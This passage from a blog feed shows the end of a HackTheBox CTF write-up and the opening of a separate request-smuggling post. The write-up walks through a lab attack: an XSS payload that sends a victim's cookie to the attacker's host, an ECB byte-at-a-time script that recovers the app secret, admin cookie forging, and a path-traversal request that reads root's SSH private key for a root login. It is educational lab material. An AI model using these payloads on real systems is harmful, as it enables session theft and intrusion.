class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        user = do_auth()</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            e = user[<span class="number">0</span>].encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">&quot;,&quot;</span> + SECRET + <span class="string">&quot;,&quot;</span> + (<span class="string">&quot;true&quot;</span> <span class="keyword">if</span> user[<span class="number">2</span>] <span class="keyword">else</span> <span class="string">&quot;false&quot;</span> )</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;setting cookie to &quot;</span>+ e)</span><br><span class="line">            resp = make_response()</span><br><span class="line">            resp.set_cookie(<span class="string">&quot;user_id&quot;</span>, value=encrypt(e))</span><br><span class="line">            resp.headers[<span class="string">&#x27;location&#x27;</span>] = url_for(<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> resp, <span class="number">302</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> show_login()</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_user</span>():</span></span><br><span class="line">    uid = request.cookies.get(<span class="string">&#x27;user_id&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        g.uid = decrypt(uid)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;decrypted to &quot;</span> + g.uid)</span><br><span class="line">        split = g.uid.split(<span class="string">&quot;,&quot;</span> + SECRET + <span class="string">&quot;,&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> g.uid:</span><br><span class="line">            g.name = split[<span class="number">0</span>]</span><br><span class="line">            g.is_admin = split[<span class="number">1</span>] == <span class="string">&quot;true&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(e))</span><br></pre></td></tr></table></figure><p>Using the XSS we found earlier we can retrieve the<code>micheal1235</code> cookie in order to analyze the format:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.location=<span class="string">&quot;http://10.10.14.80:8000/&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>We get the following cookie:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.129.119.65 - - [18/Apr/2022 15:55:10] <span class="string">&quot;GET /user_id=49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb HTTP/1.1&quot;</span> 404 -</span><br></pre></td></tr></table></figure><p>Alright, so we know how the cookie is being created, its exact format and how it is encrypted.<br>If we find a way to retrieve the <code>SECRET</code> used to create the encrypted cookie we should be able to forge an <code>admin</code> cookie and authenticate as such.</p><h3 id="ECB-Attack"><a href="#ECB-Attack" class="headerlink" title="ECB Attack"></a>ECB Attack</h3><p>From the source code of <code>[app.py](http://app.py)</code> we know the encryption method used to create cookies is Electectronic Codebook (ECB).</p><blockquote><p><strong>Electronic codebook (ECB)</strong><br>The simplest (and not to be used anymore) of the encryption modes is the electronic codebook (ECB) mode. The message is divided into blocks, and each block is encrypted separately.<br>The disadvantage of this method is a lack of diffusion. Because ECB encrypts identical plaintext blocks into identical ciphertext blocks, it does not hide data patterns well. ECB is not recommended for use in cryptographic protocols.<br><a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_Codebook_.28ECB.29">Wikipedia</a></p></blockquote><p>In ECB mode, each block of plain-text is encrypted independently with the key as illustrated by the diagram below.</p><p><img src="https://user-images.githubusercontent.com/9076747/164252769-66526746-ec42-4118-b50d-6b5c3dd08b04.png" alt="https://user-images.githubusercontent.com/9076747/164252769-66526746-ec42-4118-b50d-6b5c3dd08b04.png"></p><p>Since each block of plain-text is encrypted with the key independently, identical blocks of plain-text will yield identical blocks of cipher-text.</p><p>For example if we had <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab</code> string encrypted with ECB the output will look like so:</p><p><img src="https://user-images.githubusercontent.com/9076747/164254008-7bde149a-bd72-4bf5-8e4e-ac08cc097458.png" alt="https://user-images.githubusercontent.com/9076747/164254008-7bde149a-bd72-4bf5-8e4e-ac08cc097458.png"></p><p>Notice how the first two blocks have the same output because they have the same input (‘a’ * 16).</p><p>So if we have two 16 byte blocks with the same input, we’ll get the same output. This is the info leak we’ll be abusing (<a href="https://c0nradsc0rner.com/2016/07/03/ecb-byte-at-a-time/">more info on ECB attacks</a>).</p><p>Our current situation is perfect to perform an adaptive chosen plain-text attack in order to retrieve the app <code>SECRET</code>.</p><p>The first step needed to attack ECB encryption is determining the block size.</p><h3 id="Determining-ECB-Block-Size"><a href="#Determining-ECB-Block-Size" class="headerlink" title="Determining ECB Block Size"></a>Determining ECB Block Size</h3><p>To determine the block size we start sending specific lengths of plain-text into our cryptographic oracle (<code>/profile/</code> endpoint of the Flask application). </p><p>With the code below we are sending an increasing number of characters (<code>A</code>) until the cipher-text (our cookie) increases by one block size.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;user_id&quot;</span>:<span class="string">&quot;49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">user_id_len = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">new_user_id_len = <span class="number">0</span></span><br><span class="line">username_len = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> user_id_len &gt;= new_user_id_len:</span><br><span class="line">    username = <span class="string">&quot;A&quot;</span> * username_len</span><br><span class="line">    request = session.post(<span class="string">&quot;http://localhost:8088/profile&quot;</span>, data=&#123;<span class="string">&quot;new_name&quot;</span>:username&#125;, cookies=cookies, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    user_id = request.cookies[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">    new_user_id_len = <span class="built_in">len</span>(user_id)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Username: <span class="subst">&#123;username&#125;</span> (<span class="subst">&#123;username_len&#125;</span>) return a <span class="subst">&#123;new_user_id_len&#125;</span> bytes lengh cipher text&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(user_id)</span><br><span class="line">    username_len+=<span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[!] Block length is: <span class="subst">&#123;new_user_id_len&#125;</span> - <span class="subst">&#123;user_id_len&#125;</span> = <span class="subst">&#123;new_user_id_len - user_id_len&#125;</span>.&quot;</span>)</span><br></pre></td></tr></table></figure><p>Let’s run it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python block_length.py </span><br><span class="line">[+] Username: A (1) <span class="built_in">return</span> a 128 bytes lengh cipher text</span><br><span class="line">a4ede69d8b7ae80488736180da942c916b0b44b082849f3f336032a5d82701dcb6ab4b8d35a059a661b415f31e899c1aaf04b1ea54c123c76cdae0970af2c7fb</span><br><span class="line">[+] Username: AA (2) <span class="built_in">return</span> a 128 bytes lengh cipher text</span><br><span class="line">21405a0146941e37cdf7ff2946224b515bcd3a54dc29900348c7742a116bbc2622a2c0f8857d63242be7beff5fa037d4703df05f4323ab57c2e39aeb0e41a8df</span><br><span class="line">[+] Username: AAA (3) <span class="built_in">return</span> a 128 bytes lengh cipher text</span><br><span class="line">08a6b38e239d0db0fba708c2ea3b70f960083b3cc2fa083da57e2592bde0753e10812508e65b4de30459aa6e9953d70e2b6177e92e4bf8d0dfccf12de355ea07</span><br><span class="line">[+] Username: AAAA (4) <span class="built_in">return</span> a 128 bytes lengh cipher text</span><br><span class="line">50ed63bc99cd1420153555b126fcd3bfb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb</span><br><span class="line">[+] Username: AAAAA (5) <span class="built_in">return</span> a 128 bytes lengh cipher text</span><br><span class="line">6da40f0d01d4f36ab4528ece20518bf92c4925c21dc4a69962e8a270c9547a89eddf64bea0c36bd8703fb69288e402f76cceb3dda6ec878825a2689fcd3a23c3</span><br><span class="line">[+] Username: AAAAAA (6) <span class="built_in">return</span> a 160 bytes lengh cipher text</span><br><span class="line">ae3b506662b7a1baf069d0e782da6d5c391ce5c01f644c0b8b0cb73ccb8bf61a98d9ab274bae93825d183c60393be9d447cb89d331973b4a476b1e08185a668719945bb4f4e3fa4cb7f1ff42564675d0</span><br><span class="line">[!] Block length is: 160 - 128 = 32.</span><br></pre></td></tr></table></figure><p>At 6 characters, our cipher-text increases by one block size. By subtracting the input length between to block number increases we can find our block length (160 - 128 = 32 bytes). </p><h3 id="ECB-Attack-1"><a href="#ECB-Attack-1" class="headerlink" title="ECB Attack"></a>ECB Attack</h3><p>The next step is finding the offset of our chosen plain-text start. The offset can usually be found by prepending bytes in increasing length to <code>block size * 2</code> of a static value until two consecutive blocks of cipher-text are found.</p><p>Thanks to the source code we know that we don’t need to calculate the offset of our plain-text (start as the first byte of a block):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># app.py</span></span><br><span class="line">e = new_name + <span class="string">&quot;,&quot;</span> + SECRET + <span class="string">&quot;,&quot;</span> + (<span class="string">&quot;true&quot;</span> <span class="keyword">if</span> g.is_admin <span class="keyword">else</span> <span class="string">&quot;false&quot;</span> )</span><br></pre></td></tr></table></figure><p>We can now start attacking the cipher-text. We’ll attack it by using a static value that’s <code>block size  - 1</code> in length (<code>start_block_gap = 31</code>). The last byte will get populated with a byte of unknown cipher-text and we record the resultant value as our reference value.</p><p>We can then brute-force the unknown byte by iterating though all possible values for the plain-text and comparing it to our reference value until we find a match.</p><p>We can come up with the following script in order to brute-force the secret:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line">cookies = &#123;<span class="string">&quot;user_id&quot;</span>: <span class="string">&quot;49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">block_size = <span class="number">32</span></span><br><span class="line">start_block_gap = <span class="number">31</span></span><br><span class="line">known = <span class="string">&#x27;,&#x27;</span>  <span class="comment"># new_name to SECRET delimiter in app.py</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_blocks</span>(<span class="params">user_id</span>):</span></span><br><span class="line">    new = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(user_id), block_size):</span><br><span class="line">        new.append(user_id[i:i+block_size])</span><br><span class="line">    <span class="keyword">return</span> new</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    request = session.post(<span class="string">&quot;http://127.0.0.1:8088/profile&quot;</span>, data=&#123;<span class="string">&quot;new_name&quot;</span>: <span class="string">&quot;A&quot;</span>*(start_block_gap - <span class="built_in">len</span>(known))&#125;, cookies=cookies, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    user_id = request.cookies[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">    reference_block = get_blocks(user_id)</span><br><span class="line">    <span class="comment"># print(&quot;[+] Reference Payload:\n&quot; + &quot;A&quot;*(start_block_gap - len(known)))</span></span><br><span class="line">    <span class="comment"># print(f&quot;[+] Reference block\n: &#123;reference_block&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> printable:</span><br><span class="line">        request = session.post(<span class="string">&quot;http://127.0.0.1:8088/profile&quot;</span>, data=&#123;<span class="string">&quot;new_name&quot;</span>: <span class="string">&quot;A&quot;</span>*(start_block_gap - <span class="built_in">len</span>(known))+known+character&#125;, cookies=cookies, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        user_id = request.cookies[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">        block = get_blocks(user_id)</span><br><span class="line">        <span class="comment"># print(&quot;[+] Payload:\n&quot; + &quot;A&quot;*(start_block_gap - len(known))+known+character)</span></span><br><span class="line">        <span class="comment"># print(block)</span></span><br><span class="line">        <span class="keyword">if</span>(block[<span class="number">1</span>] == reference_block[<span class="number">1</span>]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] Reference block found!&quot;</span>)</span><br><span class="line">            known += character</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Current secret: <span class="subst">&#123;known&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>Running the attack:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python ecb_attack.py</span><br><span class="line">[!] Reference block found!</span><br><span class="line">Current secret: ,7</span><br><span class="line">[!] Reference block found!</span><br><span class="line">Current secret: ,7h</span><br><span class="line">[...]</span><br><span class="line">Current secret: ,7h15_15_4_v3ry_57r0n6_4nd_uncr</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/home/hg8/hackthebox/machines/fingerprint/root/att.py&quot;</span>, line 22, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    user_id = request.cookies[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3.10/site-packages/requests/cookies.py&quot;</span>, line 328, <span class="keyword">in</span> __getitem__</span><br><span class="line">    <span class="built_in">return</span> self._find_no_duplicates(name)</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3.10/site-packages/requests/cookies.py&quot;</span>, line 399, <span class="keyword">in</span> _find_no_duplicates</span><br><span class="line">    raise KeyError(<span class="string">&#x27;name=%r, domain=%r, path=%r&#x27;</span> % (name, domain, path))</span><br><span class="line">KeyError: <span class="string">&quot;name=&#x27;user_id&#x27;, domain=None, path=None&quot;</span></span><br></pre></td></tr></table></figure><p>And we got an error. It’s because the secret seems to be more than 32 chars. After tweaking our script a bit to use 64 bytes instead (<code>start_block_gap = 63</code> and <code>block[3] == reference_block[3])</code> we manage to retrieve the full secret:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python ecb_attack.py</span><br><span class="line">[!] Reference block found!</span><br><span class="line">Current secret: ,7h</span><br><span class="line">[...]</span><br><span class="line">Current secret: ,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!,<span class="literal">false</span></span><br></pre></td></tr></table></figure><h3 id="Cookie-forging-part-2"><a href="#Cookie-forging-part-2" class="headerlink" title="Cookie forging - part 2"></a>Cookie forging - part 2</h3><p>Alright, now that we have the secret can we find a way to login as <code>admin</code> ? Unfortunately we can only manipulate the username part of the cookie, but if we dig in the code a bit more we notice an interesting flaw in the cookie loading logic:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_user</span>():</span></span><br><span class="line">    uid = request.cookies.get(<span class="string">&#x27;user_id&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        g.uid = decrypt(uid)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;decrypted to &quot;</span> + g.uid)</span><br><span class="line">        split = g.uid.split(<span class="string">&quot;,&quot;</span> + SECRET + <span class="string">&quot;,&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> g.uid:</span><br><span class="line">            g.name = split[<span class="number">0</span>]</span><br><span class="line">            g.is_admin = split[<span class="number">1</span>] == <span class="string">&quot;true&quot;</span></span><br></pre></td></tr></table></figure><p>The split is being run with <code>&quot;,&quot; + SECRET + &quot;,&quot;</code> in order to determine the username and if the user is Admin or not.</p><p>Knowing the secret we can append <code>,SECRET,true</code> to our username like so <code>hg8,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!,true</code> and the application should trust us as admin when processing the cookie:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python</span><br><span class="line">Python 3.10.4 (main, Mar 23 2022, 23:05:40) [GCC 11.2.0] on linux</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; SECRET = <span class="string">&quot;7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!&quot;</span></span><br><span class="line">&gt;&gt;&gt; uid = <span class="string">&quot;hg8,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!,true,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!,false&quot;</span></span><br><span class="line">&gt;&gt;&gt; split = uid.split(<span class="string">&quot;,&quot;</span> + SECRET + <span class="string">&quot;,&quot;</span>)</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(split)</span><br><span class="line">[<span class="string">&#x27;hg8&#x27;</span>, <span class="string">&#x27;true&#x27;</span>, <span class="string">&#x27;false&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">print</span>(split[1])</span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure><p>Let’s now script this to create and receive the correct <code>admin</code> cookie:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">start_block_gap = <span class="number">64</span></span><br><span class="line">known = <span class="string">&quot;,7h15_15_4_v3ry_57r0n6_4nd_uncr4ck4bl3_p455phr453!!!,true&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;user_id&quot;</span>:<span class="string">&quot;49f5f0062780bed62dc06bf4a8d2dd9cb5c3fda50e19a5a840262c26c001bb0338550635d9fd36fef81113d9fbd15805193308e099ee214406b0a87c0b6587fb&quot;</span>&#125;</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">r = s.post(<span class="string">&quot;http://127.0.0.1:8088/profile&quot;</span>, data = &#123;<span class="string">&quot;new_name&quot;</span>:<span class="string">&quot;A&quot;</span>*(start_block_gap-<span class="built_in">len</span>(known))+known&#125;, cookies=cookies, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">user_id = r.cookies[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(user_id)</span><br></pre></td></tr></table></figure><p>Let’s run it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python admin_cookie.py</span><br><span class="line">feb0765bda04614d2f52acc15414e80afb4f34faed3576cfcf70f713ffea485b01b1b06d23e2c6c8eacc793c07597edc4beba4fa5b1c380302525ee6e935282ff30abe9eba1c358b7a675b5e1e9ad7548c9b3fefd732c4a597b9edd3bebc9e1cf45c2407de3a6ead5cc9b932f55fdf92c5dd1d4c7488606dc98abd2d888f12ef</span><br></pre></td></tr></table></figure><h3 id="LFI-as-root"><a href="#LFI-as-root" class="headerlink" title="LFI as root"></a>LFI as root</h3><p>Among other things a good idea is to try the LFI vulnerability we found at the beginning to see if this updated version is still vulnerable and runs with higher privileges thanks to our <code>admin</code> cookie.<br>And… Bingo!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl --path-as-is <span class="string">&quot;http://127.0.0.1:8088/admin/view/../../root/.ssh/id_rsa&quot;</span> --cookie <span class="string">&quot;user_id=feb0765bda04614d2f52acc15414e80afb4f34faed3576cfcf70f713ffea485b01b1b06d23e2c6c8eacc793c07597edc4beba4fa5b1c380302525ee6e935282ff30abe9eba1c358b7a675b5e1e9ad7548c9b3fefd732c4a597b9edd3bebc9e1cf45c2407de3a6ead5cc9b932f55fdf92c5dd1d4c7488606dc98abd2d888f12ef&quot;</span></span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpQIBAAKCAQEAvBdEECQOhzxNhtcyq8/TU6T1hbSK2WYbpF3OBMlCKUeh5Z62</span><br><span class="line">i9RmFG1BVU5i7IMAVelL92WrGgYXfp2A9oIeLugEIjGcqAkK0aqWM6PnaSvGsnzj</span><br><span class="line">wmncPtNqudxWMPMozOc5baf9RIWDGG84KZrhk+FMt75amL6uFgz/ztXsHAotrBF8</span><br><span class="line">[...]</span><br><span class="line">pUY3RgECgYEAyWrVpT9rI4j2pDC/ht54dtCltxw+jcZp5F57IsAy7ldlsefuwoNr</span><br><span class="line">GWUYBeBWuK8vx14XYNvMt45eg/GaU02VSoczuNPIvOoKbrH3+BXK290zxvwznqTS</span><br><span class="line">oggFxgjTq+oAawHPmDGDrWgqoa/Aecd6C0t94Tv7avfE9ZBJ4QWMsms=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh root@fingerprint.htb -i id_rsa</span><br><span class="line"></span><br><span class="line">Last login: Wed Jan 26 16:38:01 2022</span><br><span class="line">root@fingerprint:~<span class="comment"># cat root.txt</span></span><br><span class="line">3c8cxxxxxxxxxx4eee585</span><br></pre></td></tr></table></figure><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://blog.h3xstream.com/2014/02/hql-for-pentesters.html">HQL for Pentesters</a><br><a href="https://zachgrace.com/posts/attacking-ecb/">Attacking ECB</a><br><a href="https://c0nradsc0rner.com/2016/07/03/ecb-byte-at-a-time/">ECB Byte at a Time</a> </p><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedback!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Insane Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> LFI </tag>
            
            <tag> JWT </tag>
            
            <tag> Cookie Forge </tag>
            
            <tag> Crypto </tag>
            
            <tag> ECB </tag>
            
            <tag> Command Injection </tag>
            
            <tag> HQL Injection </tag>
            
            <tag> Bruteforce </tag>
            
            <tag> XSS </tag>
            
            <tag> Reverse Shell </tag>
            
            <tag> Flask </tag>
            
            <tag> SUID </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc CTF - Request Smuggling</title>
      <link href="/posts/misc-ctf/request-smuggling/"/>
      <url>/posts/misc-ctf/request-smuggling/</url>
      
        <content type="html"><![CDATA[<p>During a CTF I recently came across a very cool challenge on Request Smuggling. I have been wanting to try my theoretical knowledge of this topic on a “real-life” scenario and this was the perfect occasion. It allowed me to get a deeper understand of what’s going on behind the hood when a request smuggling happens.</p><p>Since request smuggling is not a so “straightforward” vulnerability to understand at first, I will try to details as much as possible this post to help you get a clear picture of this cool vulnerability. </p><p><strong>Tl;Dr:</strong> In this challenge you have to exploit Request Smuggling in order to access a authentication protected endpoint and get the flag.</p><p>While not being in the OWASP Top 10, Request Smuggling is a very interesting vulnerability worth knowing about.</p><p>Alright! Let’s get into the details now!</p><hr><h2 id="About-Request-Smuggling"><a href="#About-Request-Smuggling" class="headerlink" title="About Request Smuggling"></a>About Request Smuggling</h2><p>Before we start let’s see a bit of history Request Smuggling. It was first presented in 2005 by Watchfire: <a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">HTTP Request Smuggling</a> and got recently repopularized by <a href="https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn">PortSwigger’s research</a>.</p><p>It’s commonly defined this way:</p><ul><li>HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.</li></ul><p>The recent trend to complexifie infrastructure made this vulnerability more common and easier to exploit.</p><p>Let’s now see in practice how it can arise.</p><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Opening the challenge display the following page:</p><p><img src="https://user-images.githubusercontent.com/9076747/88634010-18632f00-d0b6-11ea-8b54-dfe7c3364b1b.png" alt="request smuggling bs bingo"></p><p>We have a simple “Bingo” game, not much more going on there. The results page prompt us a <code>Basic Auth</code> so we can’t access it:</p><p><img src="https://user-images.githubusercontent.com/9076747/88634117-43e61980-d0b6-11ea-9f54-616e2caf7449.png" alt="haproxy authentication"></p><p>Let’s gather as much informations as we can to better understand how the back-end of this app can be working.</p><p>First we notice the web server is running <code>gunicorn</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://misc.ctf:33433/ -I</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: gunicorn/19.9.0</span><br><span class="line">Date: Wed, 03 Jun 2020 13:15:33 GMT</span><br><span class="line">Content-Type: text/html; 